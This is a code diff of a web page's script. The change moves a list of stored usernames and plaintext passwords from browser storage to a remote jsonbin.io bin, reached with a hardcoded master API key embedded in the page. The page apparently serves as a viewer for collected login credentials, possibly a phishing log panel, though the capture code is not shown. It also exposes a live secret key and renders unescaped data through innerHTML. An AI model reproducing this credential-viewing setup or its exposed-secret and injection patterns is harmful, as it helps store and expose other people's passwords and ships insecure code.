@@ -119,38 +119,71 @@
   </div>
 
   <script>
+    const BIN_ID = "67fccb0b8960c979a584b5d5"; // Use a new BIN_ID for logins if needed
+    const MASTER_KEY = "$2a$10$PlYW4zt8k/Be46UjnPgRSex64CZn7Sk7ifMW09AgYaT1.jS2pwjnO";
+    const API_URL = `https://api.jsonbin.io/v3/b/${BIN_ID}`;
     const loginDetailsDiv = document.getElementById('loginDetails');
-    let logins = JSON.parse(localStorage.getItem('logins') || '[]');
 
-    function displayLogins() {
-      loginDetailsDiv.innerHTML = '';
-      logins.forEach(login => {
-        const detailItem = document.createElement('div');
-        detailItem.className = 'detail-item';
-        detailItem.innerHTML = `
-          <span>Username: ${login.username} - Password: ${login.password} - Date: ${login.date}</span>
-          <button onclick="deleteLogin(${login.id})">Delete</button>
-        `;
-        loginDetailsDiv.appendChild(detailItem);
-      });
+    async function displayLogins() {
+      try {
+        const response = await fetch(API_URL + "/latest", { headers: { "X-Master-Key": MASTER_KEY } });
+        if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
+        const data = await response.json();
+        const logins = data.record.logins || [];
+        loginDetailsDiv.innerHTML = '';
+        logins.forEach(login => {
+          const detailItem = document.createElement('div');
+          detailItem.className = 'detail-item';
+          detailItem.innerHTML = `
+            <span>Username: ${login.username} - Password: ${login.password} - Date: ${login.date}</span>
+            <button onclick="deleteLogin(${login.id})">Delete</button>
+          `;
+          loginDetailsDiv.appendChild(detailItem);
+        });
+      } catch (error) {
+        console.error("Error loading logins:", error);
+        loginDetailsDiv.innerHTML = '<p>Error loading logins.</p>';
+      }
     }
 
-    function deleteLogin(id) {
-      logins = logins.filter(l => l.id !== id);
-      localStorage.setItem('logins', JSON.stringify(logins));
+    async function deleteLogin(id) {
+      if (!confirm('Are you sure?')) return;
+      try {
+        const response = await fetch(API_URL + "/latest", { headers: { "X-Master-Key": MASTER_KEY } });
+        const data = await response.json();
+        const logins = data.record.logins || [];
+        const newLogins = logins.filter(l => l.id !== id);
+        await fetch(API_URL, {
+          method: "PUT",
+          headers: { "X-Master-Key": MASTER_KEY, "Content-Type": "application/json" },
+          body: JSON.stringify({ ...data.record, logins: newLogins })
+        });
+        displayLogins();
+        alert('Login deleted.');
+      } catch (error) {
+        console.error("Error deleting login:", error);
+      }
+    }
+
+    async function clearAll() {
+      if (!confirm('Are you sure?')) return;
+      try {
+        await fetch(API_URL, {
+          method: "PUT",
+          headers: { "X-Master-Key": MASTER_KEY, "Content-Type": "application/json" },
+          body: JSON.stringify({ logins: [] })
+        });
+        displayLogins();
+        alert('All logins cleared.');
+      } catch (error) {
+        console.error("Error clearing logins:", error);
+      }
+    }
+
+    window.onload = () => {
       displayLogins();
-      alert('Login deleted.');
-    }
-
-    function clearAll() {
-      logins = [];
-      localStorage.setItem('logins', JSON.stringify(logins));
-      displayLogins();
-      alert('All logins cleared.');
-    }
-
-    // Load and display saved logins
-    displayLogins();
+    };
   </script>
-</body>
+<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'93132943fc791375',t:'MTc0NDgwMTA0MC4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
 </html>
+</DOCUMENT>
